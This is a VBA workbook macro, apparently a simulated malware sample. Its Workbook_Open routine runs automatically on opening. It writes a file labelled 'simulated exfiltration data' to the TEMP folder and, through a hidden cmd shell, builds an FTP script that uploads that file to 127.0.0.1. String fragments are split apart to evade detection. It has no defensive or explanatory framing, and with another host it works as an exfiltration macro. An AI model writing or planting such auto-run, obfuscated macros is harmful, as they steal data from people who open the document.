Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim f As Integer, logPath As String
    logPath = Environ("TEMP") & "\obliv" & "ionx_log." & "txt"
    f = FreeFile
    Open logPath For Output As #f
    Print #f, "marke" & "r-ftp-" & "log:" & " simula" & "ted e" & "xfiltrat" & "ion d" & "ata"
    Close #f
    Shell "cmd /c echo open 127.0.0.1> " & Environ("TEMP") & "\oblivionx_ftp.txt & echo put oblivionx_log.txt>> " & Environ("TEMP") & "\oblivionx_ftp.txt & echo quit>> " & Environ("TEMP") & "\obliv" & "ionx_f" & "tp.tx" & "t", 0
End Sub
